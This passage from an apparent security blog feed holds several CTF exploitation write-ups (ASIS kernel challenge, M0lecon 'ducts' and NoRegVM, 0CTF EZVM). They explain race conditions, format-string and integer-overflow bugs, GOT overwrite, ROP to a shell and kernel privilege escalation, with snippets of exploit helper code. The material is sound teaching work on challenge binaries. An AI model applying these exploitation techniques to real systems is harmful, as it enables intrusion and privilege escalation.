</pre> <p>So, all we need to do is just call <code class="language-plaintext highlighter-rouge">commit_creds(0xffffffff81e3bf60)</code> to become root.</p> <h3 id="the-final-touches">The final touches</h3> <p>With some magic about <code class="language-plaintext highlighter-rouge">swapgs</code> and <code class="language-plaintext highlighter-rouge">iretq</code> as perfectly explained by lkmidas <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">here</a>, all we had to do was to return to user space properly and run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code>.</p> <p>It also turns out that the VM has a libc inside it. So we don’t need to compile the exploit statically which significantly reduces the size of the binary. Still, with some <code class="language-plaintext highlighter-rouge">gzip</code> + <code class="language-plaintext highlighter-rouge">base64</code> magic, @zolutal was able to run the exploit on the remote machine and got the flag.</p> <p>The final exploit code is available <a href="/assets/c/asis/exploit.c">here</a>. And the challenge files are available <a href="/assets/binary/asis/vuln.tar.gz">here</a>.</p> <h2 id="extra-credit">Extra Credit</h2> <p>After the CTF, I saw @kylebot and @zolutal talk about other writeups for this challenge and @kylebot mentioned that some writeup managed to use the CPU Entry Area. Apparently, there’s a special instruction called <code class="language-plaintext highlighter-rouge">sgdt</code> which can return the pointer to the randomized CPU Entry Area (thus defeating KASLR). But, on modern kernels (&lt;6.2), this instruction is not allowed because of the 11th bit in the <code class="language-plaintext highlighter-rouge">CR4</code> register called <code class="language-plaintext highlighter-rouge">UMIP</code> (User-Mode Instruction Prevention). However, this mitigation isn’t implemented in QEMU (when its using TCG) and so it can be used to leak the CPU Entry Area address. Their solution involved storing the fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> in the CPU Entry Area, followed by using the <code class="language-plaintext highlighter-rouge">sgdt</code> instruction to get the address of the fake structure which is then used to overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>Additionally, this challenge would not panic on warnings, and so it would have been possible to just leak a kernel pointer using a warning. Maybe I’ll think of these the next time I try a kernel challenge.</p> <p>I recommend reading their writeup which is available <a href="https://kqx.io/writeups/fileno/">here</a>.</p>]]></content><author><name></name></author><category term="writeup"/><category term="ctf"/><category term="kernel"/><category term="pwn"/><summary type="html"><![CDATA[Solving the File No! challenge from ASIS CTF 2025]]></summary></entry><entry><title type="html">M0lecon CTF Teaser 2024 ducts Writeup</title><link href="https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts/" rel="alternate" type="text/html" title="M0lecon CTF Teaser 2024 ducts Writeup"/><published>2024-09-14T15:09:00+00:00</published><updated>2024-09-14T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts/"><![CDATA[<p>This CTF was the kickoff of Shellphish Academy.</p> <p>Now Shellphish Academy is a lot like DEFCON Academy (which @Zardus explains with such grace in this DEFCON talk). So for this CTF, we had a good number of blue-belt hackers from pwn.college play with Shellphish.</p> <p>It was a fun experience, and I got to meet a bunch of super awesome hackers in the process too.</p> <p>This challenge was pretty fun as well. So lets get into it.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <p>The binary forks off a process to act as the <code class="language-plaintext highlighter-rouge">backend</code> process. This <code class="language-plaintext highlighter-rouge">backend</code> process reads input from a pipe and then performs either of two operations based on the type of input.</p> <p>If the input is a message, it is stored into a linked list of messages. Nothing else happens when the <code class="language-plaintext highlighter-rouge">backend</code> receives a message except for writing the content of the message to <code class="language-plaintext highlighter-rouge">/dev/null</code> which is probably not relevant to the solution at all.</p> <p>The other part of <code class="language-plaintext highlighter-rouge">backend</code> is the command handling. And this command handler is the interesting part. There’s three commands that can be sent</p> <ul> <li>Flush messages</li> <li>Print messages</li> <li>Redact message</li> </ul> <p>The first two are pretty self-explanatory. The only extra detail is that <code class="language-plaintext highlighter-rouge">print_messages</code> also prints out some pointers which will be useful for a leak.</p> <p>The <code class="language-plaintext highlighter-rouge">redact_message</code> uses an index specified in the command to walk the linked-list and identify the correct message. It then uses an 8-byte value specified in the command to overwrite the content of the message.</p> <p>This is the structure of the command and message that I identified.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
<span class="n">message</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">content</span><span class="p">[];</span>
<span class="p">}</span> <span class="n">message</span><span class="p">;</span>

<span class="k">struct</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">cmd</span><span class="p">;</span>
<span class="kt">long</span> <span class="n">idx</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">content</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span> <span class="n">command</span><span class="p">;</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">backend</code> process is only half of the whole binary. The other half is the “frontend” which is a fork-server.</p> <p>The binary spins up a new fork to handle incoming connections to a specific port. This process then uses the <code class="language-plaintext highlighter-rouge">talk</code> function to read messages from the user.</p> <p>These messages are then sent over the pipe to the <code class="language-plaintext highlighter-rouge">backend</code> after which the process exits.</p> <h2 id="step-2-the-bug">Step 2: The Bug</h2> <p>I spent a few minutes trying to see if there was a buffer overflow in the <code class="language-plaintext highlighter-rouge">talk</code> function. Initially it seemed like the input reading loop only terminated on newlines. I soon found that after the buffer limit was reached, the program would go into an infinite loop. No dice.</p> <p>The other alternative was a race-condition since we could spawn multiple threads at the same time. However, the frontend was sending data to the <code class="language-plaintext highlighter-rouge">backend</code> using a <code class="language-plaintext highlighter-rouge">write</code> function call.</p> <p>To the best of my limited kernel knowledge, the <code class="language-plaintext highlighter-rouge">write</code> function is atomic. And after consulting with @kylebot and @zolutal, I was assured that this was the case.</p> <p>But the size of the buffer that the <code class="language-plaintext highlighter-rouge">talk</code> function used was absolutely massive (0x27100)! And after some trial and error, I found that inputs of the size 0x20000 are not written atomically. Which meant that we could cause some mischief.</p> <p>I wrote up a script that created two connections to the port and sent two giant buffers at the same time. And I saw some output that confirmed that the two giant buffers were getting spliced together. Which meant that we could possibly put a fake command into a message content and have the <code class="language-plaintext highlighter-rouge">backend</code> perform our command.</p> <p>The <code class="language-plaintext highlighter-rouge">backend</code> function would read 4 bytes from the pipe and check if the value read was 0 or 1. If the value read was neither, it would just read the next 4 bytes. This meant that even if the message was not split exactly at the fake chunk, it would be fine since the bytes before the fake chunk would simply be read and discarded.</p> <p>I decided to put my fake chunks in the last page of the giant message to give it the highest probability of triggering the race-condition.</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>So with the race-condition, I was able to get a bunch of fake commands executed by the <code class="language-plaintext highlighter-rouge">backend</code>. This gave me PIE leak and a LIBC leak that worked 6/10 times.</p> <p>But for the actual exploit, I confirmed with @x3ero0 that the <code class="language-plaintext highlighter-rouge">redact_message</code> was our target. Recall that with the <code class="language-plaintext highlighter-rouge">redact_message</code> function, we could overwrite 8 bytes of the content of a specific message in the linked-list with a value that we control. Combined with the fact that we can craft arbitrary messages, we basically have memory leaks and an 8-byte arbitrary overwrite.</p> <p>In order to do this, I created a fake message that contained an arbitrary <code class="language-plaintext highlighter-rouge">next</code> pointer. The next question was to identify a target to overwrite and a value to overwrite it with.</p> <p>The binary only had partial RELRO and we could overwrite some of the GOT table pointers. However, the <code class="language-plaintext highlighter-rouge">redact_message</code> would write the value 1 into the message type before overwriting the content. So we had to choose an address <code class="language-plaintext highlighter-rouge">X</code> such that <code class="language-plaintext highlighter-rouge">X-0x50</code> was writable and <code class="language-plaintext highlighter-rouge">X</code> was a GOT function that would be called with controlled input.</p> <p>I found that <code class="language-plaintext highlighter-rouge">fwrite</code> was a good candidate that met these requirements. It was only called when a message was received and only used to write the content of the message into <code class="language-plaintext highlighter-rouge">/dev/null</code>.</p> <p>Eventually I got all my offsets proper and got the shell locally. And since ASU network was interfering with my connection to the challenge server, I had @ElChals run the script and get the flag.</p> <p>The final exploit is available here: <a href="/assets/python/ducts/exploit.py">Exploit</a></p>]]></content><author><name></name></author><category term="writeup"/><category term="ctf"/><category term="race-condition"/><category term="overflow"/><summary type="html"><![CDATA[Solving the ducts challenge from M0lecon Teaser 2023]]></summary></entry><entry><title type="html">M0lecon CTF 2023 NoRegVM Writeup</title><link href="https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm/" rel="alternate" type="text/html" title="M0lecon CTF 2023 NoRegVM Writeup"/><published>2023-05-17T15:09:00+00:00</published><updated>2023-05-17T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm/"><![CDATA[<p>For some reason, I’ve found VM exploitation challenges to be quite interesting recently.</p> <p>I managed to solve a challenge called NoRegVM from M0lecon CTF 2023. I also tried to solve a reversing challenge involving the same binary, but I couldn’t find the final solution. But that’s for another blog post.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <p>This program lets you provide the code and memory that a VM is initialized with.</p> <p>The VM can perform 13 different functions including reading and writing to the standard input/output.</p> <p>This VM does not use registers, so all the operands used for an operation should be immediate values or memory addresses. Data can be copied to and from the memory using the <code class="language-plaintext highlighter-rouge">pop_in</code> and <code class="language-plaintext highlighter-rouge">pop_out</code> instructions in the VM.</p> <h2 id="step-2-the-bugs">Step 2: The Bug(s)</h2> <p>I found three bugs in this challenge and I eventually used all of them for the final exploit.</p> <p>The first bug is a buffer overflow vulnerability in the <code class="language-plaintext highlighter-rouge">pop_out</code> function.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/popout-480.webp 480w,/assets/img/noregvm/popout-800.webp 800w,/assets/img/noregvm/popout-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/popout.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The loop in <code class="language-plaintext highlighter-rouge">pop_out</code> can be executed as many times as we want. This would eventually lead to an out-of-bounds write of the <code class="language-plaintext highlighter-rouge">output</code> buffer.</p> <p>And that leads us to the second bug which is a format string vulnerability in the <code class="language-plaintext highlighter-rouge">write_buf</code> function.</p> <p>Looking at the pseudo-code generated by IDA, this vulnerability is not apparent.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/pseudocode-480.webp 480w,/assets/img/noregvm/pseudocode-800.webp 800w,/assets/img/noregvm/pseudocode-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/pseudocode.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>However, if you look at the actual assembly code, we see that the format specifier used by <code class="language-plaintext highlighter-rouge">printf</code> is a buffer in the data section of the binary.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/assembly-480.webp 480w,/assets/img/noregvm/assembly-800.webp 800w,/assets/img/noregvm/assembly-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/assembly.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>And it so happens that this <code class="language-plaintext highlighter-rouge">FMT_STR</code> buffer lies just after the <code class="language-plaintext highlighter-rouge">output</code> buffer.</p> <p>Therefore, by overflowing the <code class="language-plaintext highlighter-rouge">output</code> buffer using the <code class="language-plaintext highlighter-rouge">pop_out</code> function, we can trigger a format string vulnerability in the <code class="language-plaintext highlighter-rouge">write_buf</code> function. This can be used to leak whatever data we need.</p> <p>I ended up leaking the heap, canary, stack, binary and libc base addresses.</p> <p>The final bug is in the <code class="language-plaintext highlighter-rouge">len</code> function.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/len-480.webp 480w,/assets/img/noregvm/len-800.webp 800w,/assets/img/noregvm/len-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/len.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>In this function again, we can execute the loop as many times as we want. This eventually leads to an out-of-bounds write of the stack buffer of size 200;</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>So the plan was clear,</p> <ul> <li>Overflow `output` buffer to overwrite `FMT_STR`</li> <li>Leak all the pointers</li> <li>Overflow stack buffer in `len` and get PC control</li> <li>????</li> <li>Profit</li> </ul> <p>A slightly annoying part about this challenge is that the loop in the <code class="language-plaintext highlighter-rouge">len</code> function will stop at the first instance of an int value 0. However, only the lower 8 bits from each memory address is copied into the stack buffer. Therefore, if the value at a memory address was 0x0100, the check for 0 would pass while only the last byte (i.e NULL) would be appended to the stack buffer.</p> <p>In order to do this, I modified the program code to generate this 0x100 value (by performing 0x10 * 0x10) and writing it to the indices where I needed NULL bytes.</p> <p>The final exploit uses the leaks in a simple ROP chain to call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p> <p>I had initially written this exploit by hard-coding the opcodes and operand values. And it was very hard to read for someone who didn’t understand my plan.</p> <p>So, after the CTF, I tried re-writing the exploit to use my assembler. And it worked with minimal adjustments! Even I was surprised.</p> <p>The final exploit is available here: <a href="/assets/python/noregvm/exploit.py">Exploit</a></p> <p>And since the assembler will keep getting updated, its better to store it somewhere like <a href="https://github.com/jkrshnmenon/scripts/blob/master/assembler_stuff/assembler.py">GitHub</a>.</p>]]></content><author><name></name></author><category term="writeup"/><category term="stack"/><category term="ctf"/><summary type="html"><![CDATA[Solving the NoRegVM challenge from M0lecon CTF 2023]]></summary></entry><entry><title type="html">OCTF 2022 EZVM Writeup</title><link href="https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm/" rel="alternate" type="text/html" title="OCTF 2022 EZVM Writeup"/><published>2023-01-05T15:09:00+00:00</published><updated>2023-01-05T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm/"><![CDATA[<p>Its been some time since I wrote one of these, so I might be a little rusty. Do bear with me.</p> <p>I wasn’t able to play 0CTF 2022 in full while it was going on but I was helping one of my teammates (@zolutal) who was trying to solve this challenge. I had briefly tried to reverse engineer the binary but didn’t have enough time to analyze it completely.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/main-480.webp 480w,/assets/img/ezvm/main-800.webp 800w,/assets/img/ezvm/main-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/main.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The main function doesn’t do much except for that 256 byte long buffer which I thought might be useful in case we needed to fill some constraints for a one-gadget. But I did not end up using that approach.</p> <p>The <code class="language-plaintext highlighter-rouge">do_main</code> function does more interesting stuff by comparison</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/do_main-480.webp 480w,/assets/img/ezvm/do_main-800.webp 800w,/assets/img/ezvm/do_main-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/do_main.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>During my hasty reverse engineering process, I ended up naming the allocation at line 24 as <code class="language-plaintext highlighter-rouge">registers</code> even though the program was basically telling me it was called <code class="language-plaintext highlighter-rouge">memory</code>. So for the rest of this blog, I’ll refer to this allocated region as <code class="language-plaintext highlighter-rouge">memory</code> even though my decompiled code says <code class="language-plaintext highlighter-rouge">registers</code>.</p> <p>The comparison at line 17 stands out pretty well as a possible location for a bug, but I was more interested in reversing the other functions.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/init_vm-480.webp 480w,/assets/img/ezvm/init_vm-800.webp 800w,/assets/img/ezvm/init_vm-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/init_vm.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Init VM clears all of the data before executing the code. However, since it uses <code class="language-plaintext highlighter-rouge">malloc</code>, some of the data on the heap might still be present and available for reuse.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/run_vm-480.webp 480w,/assets/img/ezvm/run_vm-800.webp 800w,/assets/img/ezvm/run_vm-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/run_vm.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>And now we get to the actual VM part.</p> <p>There’s quite a lot of switch cases here. Each instruction is apparently one byte and the VM follows a stack based model. Which means that for an arithmetic operation, two values on the top of the stack are popped off and the result is pushed back on to the stack.</p> <p>The program does make sure that the stack does not overflow or underflow.</p> <p>Line 27 in the above screenshot looked a bit weird to me since it checks if <code class="language-plaintext highlighter-rouge">operand1</code> is lesser than 4 and then adds 4 to it while dereferencing.</p> <p>However, looking at the memory layout, it makes more sense.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/memory-480.webp 480w,/assets/img/ezvm/memory-800.webp 800w,/assets/img/ezvm/memory-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/memory.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Like I had mentioned earlier, the <code class="language-plaintext highlighter-rouge">regs</code> variable that I had named is actually supposed to be called <code class="language-plaintext highlighter-rouge">memory</code>.</p> <p>The VM maintains its own 4 registers each of which is 8 bytes long. These registers are referred to in the decompiled code as <code class="language-plaintext highlighter-rouge">internal_array</code>. And so we have</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&amp;</span><span class="n">regs</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">internal_array</span><span class="p">[</span><span class="n">x</span><span class="p">]</span></code></pre></figure> <p>This makes the reverse engineering much more understandable.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/jump-480.webp 480w,/assets/img/ezvm/jump-800.webp 800w,/assets/img/ezvm/jump-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/jump.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The VM even supports jump instructions. Although it does make sure that the program counter does not go beyond the bounds of the code section.</p> <h2 id="step-2-the-bug">Step 2: The Bug</h2> <p>I wasn’t able to find the bug here, but @zolutal found it.</p> <p>There are two bugs here that combine together to provide an arbitrary 8-byte write.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/vuln-480.webp 480w,/assets/img/ezvm/vuln-800.webp 800w,/assets/img/ezvm/vuln-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/vuln.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>In line 156, the variable <code class="language-plaintext highlighter-rouge">op2_</code> is an 8 byte value that we can control. So if it is large enough, it can index memory outside the chunk allocated in the <code class="language-plaintext highlighter-rouge">regs</code> variable.</p> <p>However, in order to do that, it must first pass the check at line 154.</p> <p>This is where the second bug comes in.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/do_main_vuln-480.webp 480w,/assets/img/ezvm/do_main_vuln-800.webp 800w,/assets/img/ezvm/do_main_vuln-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/do_main_vuln.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>These lines inside the <code class="language-plaintext highlighter-rouge">do_main</code> function allow us to set the <code class="language-plaintext highlighter-rouge">regs_size</code> variable in the <code class="language-plaintext highlighter-rouge">run_vm</code> function to any value up to 0x2000000000000000 (or 1 « 61 )</p> <p>However, when the allocation happens at the <code class="language-plaintext highlighter-rouge">malloc</code>, this value is multiplied with 8.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="nf">hex</span><span class="p">(((</span><span class="mh">0x2000000000000000</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="sh">'</span><span class="s">0x80</span><span class="sh">'</span></code></pre></figure> <p>Therefore, when we request an allocation of size 0x2000000000000000 + 0x10, the multiplication overflows into a value 0x80 which is the size of the buffer that <code class="language-plaintext highlighter-rouge">malloc</code> allocates.</p> <p>Now, in <code class="language-plaintext highlighter-rouge">run_vm</code>, the <code class="language-plaintext highlighter-rouge">regs_size</code> is 0x2000000000000000 + 0x10 which allows us to write to memory out of the bounds of the <code class="language-plaintext highlighter-rouge">regs</code> buffer.</p> <p>However, in the switch case number 22 in <code class="language-plaintext highlighter-rouge">run_vm</code>, we cannot use this idea to get an arbitrary read. This is because the comparison in line 162 will first multiply the <code class="language-plaintext highlighter-rouge">regs_size</code> by 8 and then divide the result by 8.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="nf">hex</span><span class="p">((((</span><span class="mh">0x2000000000000000</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span><span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="sh">'</span><span class="s">0x10</span><span class="sh">'</span></code></pre></figure> <p>This means that we cannot use this functionality to get an arbitrary read.</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>Up until now, the only primitives we had was an arbitrary write. Moreover, we can only trigger this arbitrary overwrite in a single VM after which we cannot reuse it again.</p> <p>With some heap massaging, we can free tcache and smallbin chunks which leave some useful pointers on the heap. But since the VM does not write any content out, we were not able to figure out a way to leak these pointers.</p> <p>One of the ideas that I had was to perform some heap fengshui to position the code buffer after the memory buffer. If we could do that, we could use the arbitrary overwrite to overwrite some values in the code with the pointers that were on the heap. This would’ve been a crazy solution, but it eventually did not work out.</p> <p>And we actually did not solve this challenge during the CTF.</p> <h2 id="step-4-yansquad">Step 4: Yansquad</h2> <p>I forgot about this challenge after some time. But then it showed up in one of the classes that I’m taking here at ASU.</p> <p>CSE 598 Topic: Emerging Cybersecurity Techniques taken by none other than @zardus involved us playing CTF’s and solving challenges together in class.</p> <p>In this class, every week, one student is responsible for picking a challenge from a CTF, deconstructing to its most basic concept and creating a simplified version of the challenge. This one week, it was @clasm’s turn to present a challenge and he chose this one.</p> <p>The simplified version of the challenge provided all the primitives you could ask for in a heap exploitation challenge. And the objective was to learn how to overwrite the <code class="language-plaintext highlighter-rouge">tls_dtors_list</code> to get PC control.</p> <p><del>I’ll put up the files for this challenge as soon as @clasm lets me know its okay to.</del> The files for this simplified challenge are available <a href="/assets/binary/ezvm/simplified.zip">here</a>.</p> <p>But once I had solved the simplified one, I wanted to give another go at the original challenge.</p> <h2 id="step-5-the-leak">Step 5: The Leak</h2> <p>This time I noticed something that I had missed. A sidechannel for leaking pointers.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/side_channel-480.webp 480w,/assets/img/ezvm/side_channel-800.webp 800w,/assets/img/ezvm/side_channel-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/side_channel.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>This switch case (which I called the <code class="language-plaintext highlighter-rouge">nop</code> case) would print a string “what??” when hit.</p> <p>Now, if I can write the code for the VM to perform some checks on the pointers and jump to a <code class="language-plaintext highlighter-rouge">nop</code> instruction if true, I will be able to leak pointers.</p> <h2 id="step-6-the-assembly">Step 6: The Assembly</h2> <p>I really did not want to write bytecode and deal with jump offsets (although maybe it would’ve been faster).</p> <p>So I ended up writing an assembler for this VM that supports labels and loops. It would replace labels with a <code class="language-plaintext highlighter-rouge">nop</code> instruction.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">assembler</span> <span class="kn">import</span> \<span class="o">*</span>

<span class="k">def</span> <span class="nf">run_vm</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">mem_count</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
<span class="n">assembler</span> <span class="o">=</span> <span class="nc">Assembler</span><span class="p">(</span><span class="n">prog</span><span class="p">)</span>
<span class="n">code</span> <span class="o">=</span> <span class="n">assembler</span><span class="p">.</span><span class="nf">assemble</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your code size:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%d</span><span class="sh">"</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your memory count:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">mem_count</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your code:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
<span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">finish!</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">continue?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
<span class="k">return</span> <span class="n">out</span></code></pre></figure> <p>I then wrote assembly code that increments a counter from zero in a loop until it becomes equal to one byte of a pointer. In each loop, this program will hit a <code class="language-plaintext highlighter-rouge">nop</code> which will make the program print the string “what??”. And upon counting the number of these strings printed out, I can get the value of this one byte.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">mem_size</span><span class="p">,</span> <span class="n">num_bytes</span><span class="p">):</span>
<span class="n">leak_byte</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
lq r0 0
push r0
li r3 {byte_idx}
push r3
shr
pop r3
push r3
li r1 0xff
push r1
and
pop r1
li r2 0x1
.loop
push r1
push r2
sub
pop r1
push r1
jnz .loop
hlt
</span><span class="sh">"""</span>
